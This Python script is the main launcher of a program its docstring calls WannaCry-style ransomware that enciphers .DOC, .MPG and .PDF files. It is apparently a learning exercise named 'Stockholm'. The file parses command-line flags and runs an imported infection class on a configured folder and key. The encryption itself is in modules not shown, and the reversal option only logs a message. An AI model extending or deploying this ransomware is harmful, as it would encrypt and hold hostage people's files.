"""Ransomware that emulates wannacry attack ciphering files with .DOC, .MPG, or .PDF extensions"""
import sys
from logger import Stockholmlogger
from config_functions import Configlibrary
from stockholm import Stockholminfection

def main():
    """main function of the program"""
    config = Configlibrary()
    st_logger = Stockholmlogger()
    st_logger.set_log_level(config.get_log_level())

    if len(sys.argv) > 1 and sys.argv[1] == "-s":
        config.set_log_level("NOTSET")
        st_logger.logger.propagate = False
    if len(sys.argv) > 1 and sys.argv[1] == "-h":
        st_logger.logger.info("imprimiendo manual de ayuda")
    elif len(sys.argv) > 1 and sys.argv[1] == "-v":
        st_logger.logger.info(config.get_program_version())
    elif len(sys.argv) > 1 and sys.argv[1] == "-r":
        if sys.argv[2]:
            st_logger.logger.info("gracias por la clave")
        else:
            st_logger.logger.error("no puedo revertir el cifrado si no me das la clave")
    else:
        stockholm = Stockholminfection(st_logger, config.get_infection_dir(),
                    config.get_infection_extensions(), config.get_infection_key())
        stockholm.run()

if __name__ == "__main__":
    main()
    